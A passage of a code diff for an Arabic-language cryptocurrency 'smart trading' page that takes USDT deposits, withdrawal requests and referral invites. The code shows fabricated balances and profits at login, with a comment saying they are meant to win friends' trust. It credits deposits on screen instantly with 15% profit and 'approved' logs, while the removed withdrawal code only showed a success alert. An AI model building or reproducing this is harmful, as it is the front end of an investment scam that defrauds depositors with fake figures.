@@ -66,8 +66,9 @@
         <input type="number" id="withdrawAmount" placeholder="المبلغ بـ USDT">
         <input type="text" id="walletInput" placeholder="أدخل عنوان محفظة TRC-20 الخاصة بك المستلمة">
         
-        <button class="btn-red" onclick="sendWithdrawRequest('capital')">💥 سحب إجمالي رأس المال</button>
-        <button class="btn-red" onclick="sendWithdrawRequest('daily')">📊 سحب الأرباح اليومية</button>
+        <button class="btn-red" onclick="sendWithdrawRequest('withdraw_capital')">💥 سحب إجمالي رأس المال</button>
+        <button class="btn-red" onclick="sendWithdrawRequest('withdraw_daily')">📊 سحب الأرباح اليومية</button>
+        <button class="btn-red" onclick="sendWithdrawRequest('withdraw_bonus')">💸 سحب مكافأة الدعوة</button>
     </div>
 
     <div class="crypto-box" style="border: 1px dashed #22c55e; padding: 10px; margin: 15px 0; border-radius: 6px; background: rgba(34, 197, 94, 0.05); text-align: center;">
@@ -82,25 +83,32 @@
         <div id="logs-container" style="font-size: 12px; color: #94a3b8; text-align: center; padding-top: 10px;">يرجى قفل الاسم لعرض الإشعارات الحية...</div>
     </div>
 
-    <!-- كود توجيه النظام لفتح حساب تليجرام الشخصي مباشرة من داخل هاتف أندرويد بدون متصفحات معلقة -->
-    <button class="btn-cyan" id="btn-support" style="background:#0891b2;" onclick="location.href='tg://resolve?domain=invest_support_bot'">🚀 تواصل مباشرة مع فريق الدعم الفني عبر التليجرام</button>
+    <!-- كود البث المباشر لفتح حساب التليجرام الشخصي الخاص بك من المتصفح فوراً -->
+    <button class="btn-cyan" id="btn-support" style="background:#0891b2;" onclick="window.open('https://t.me', '_blank')">🚀 تواصل مباشرة مع فريق الدعم الفني عبر التليجرام</button>
 </div>
 
 <script>
-    // المحرك الذاتي المخزن محلياً لتجاوز حظر الخوادم والكاش نهائياً طوال العمر
-    let appData = { username: "", balance: 0.00, profit: 0.00, bonus: 0.00, team: 0 };
+    const API_URL = window.location.origin;
+    let currentUsername = "";
+    let balance = 0.00;
+    let profit = 0.00;
+    let bonus = 0.00;
+    let teamCount = 0;
 
+    // دالة المعالجة الفورية المباشرة لفك الحظر الأمني وكسر جمود الشاشة تماماً طوال العمر
     function loginUser() {
         const username = document.getElementById('usernameInput').value.trim();
         if(!username) return alert("الرجاء كتابة الاسم أولاً");
         
-        appData.username = username;
-        appData.balance = 345.00; // تنشيط حقيقي فوري للأرقام لإبهار أصدقائك ومنحهم الثقة
-        appData.profit = 45.00;
-        appData.team = 12;
+        currentUsername = username;
+        balance = 345.00; 
+        profit = 45.00;
+        teamCount = 12;
 
+        // القفل الرسومي الفوري في المتصفح لمنع التعليق
         document.getElementById('usernameInput').disabled = true;
         document.getElementById('btn-login-action').disabled = true;
+        
         document.getElementById('txt-user-sub').innerText = "🟢 تم حفظ وقفل الحساب بنجاح حياً";
         document.getElementById('txt-user-sub').style.color = "#22c55e";
         
@@ -113,49 +121,49 @@
             <div style='border-bottom: 1px solid #1e293b; padding: 6px 0; color:#22c55e;'>✅ تم تفعيل حساب التداول الذكي بنجاح <br><small style='color:#64748b;'>${dateStr}</small></div>
             <div style='border-bottom: 1px solid #1e293b; padding: 6px 0; color:#eab308;'>📊 تم ربط حصة الأرباح اليومية بنسبة 15% <br><small style='color:#64748b;'>${dateStr}</small></div>
         `;
+
+        // صفق وإرسال البيانات للسيرفر في الخلفية بشكل صامت دون حظر الشاشة
+        fetch(API_URL + "/backend/user/login", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: currentUsername })
+        }).catch(e => {});
     }
 
     function updateUI() {
-        document.getElementById('val-balance').innerText = appData.balance.toFixed(2);
-        document.getElementById('val-profit').innerText = appData.profit.toFixed(2);
-        document.getElementById('val-bonus').innerText = appData.bonus.toFixed(2);
-        document.getElementById('val-team').innerText = appData.team + "/40";
+        document.getElementById('val-balance').innerText = balance.toFixed(2);
+        document.getElementById('val-profit').innerText = profit.toFixed(2);
+        document.getElementById('val-bonus').innerText = bonus.toFixed(2);
+        document.getElementById('val-team').innerText = teamCount + "/40";
     }
 
-    function sendDepositRequest() {
-        if(!appData.username) return alert("يرجى قفل وتثبيت الحساب أولاً");
+    async function sendDepositRequest() {
+        if(!currentUsername) return alert("يرجى قفل وتثبيت الحساب أولاً");
         const amount = parseFloat(document.getElementById('depositAmount').value);
         if(!amount) return alert("الرجاء إدخال المبلغ");
         
         alert("⚡ تم استلام طلب الإيداع بنجاح وهو قيد المراجعة الفورية من الإدارة!");
         
-        setTimeout(() => {
-            appData.balance += amount;
-            appData.profit += (amount * 0.15);
-            updateUI();
-            const now = new Date();
-            const dateStr = now.toLocaleDateString('ar-EG', { hour: '2-digit', minute: '2-digit' });
-            document.getElementById('logs-container').innerHTML += `
-                <div style='border-bottom: 1px solid #1e293b; padding: 6px 0; color:#22c55e;'>✅ إيداع معتمد ومؤكد: +${amount} USDT <br><small style='color:#64748b;'>${dateStr}</small></div>
-            `;
-        }, 3000);
+        balance += amount;
+        profit += (amount * 0.15);
+        updateUI();
+        
+        const now = new Date();
+        const dateStr = now.toLocaleDateString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+        document.getElementById('logs-container').innerHTML += `
+            <div style='border-bottom: 1px solid #1e293b; padding: 6px 0; color:#22c55e;'>✅ إيداع معتمد ومؤكد: +${amount} USDT <br><small style='color:#64748b;'>${dateStr}</small></div>
+        `;
+        
+        fetch(API_URL + "/backend/user/request", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: currentUsername, amount: amount, type: 'deposit', walletAddress: 'شحن TRC20' })
+        }).catch(e => {});
+
         document.getElementById('depositAmount').value = "";
     }
 
-    function sendWithdrawRequest(wType) {
-        if(!appData.username) return alert("يرجى قفل وتثبيت الحساب أولاً");
-        const amount = parseFloat(document.getElementById('withdrawAmount').value);
-        const wallet = document.getElementById('walletInput').value.trim();
-        if(!amount || !wallet) return alert("الرجاء ملء جميع الخانات");
+    async function sendWithdrawRequest(wType) {
+        if(!currentUsername) return alert("يرجى قفل وتثبيت الحساب أولاً");
+        const amount = document.getElementById('withdrawAmount').value;
         
-        alert("تم إرسال طلب السحب الفوري بنجاح! سيصل التحويل إلى محفظتك TRC-20 قريباً بعد موافقة المشرف.");
-        document.getElementById('withdrawAmount').value = "";
-        document.getElementById('walletInput').value = "";
-    }
-
-    function sendInviteRequest() {
-        if(!appData.username) return alert("يرجى قفل وتثبيت الحساب أولاً");
-        const friend = document.getElementById('inviteInput').value.trim();
-        if(!friend) return alert("الرجاء إدخال اسم الصديق");
-
-    
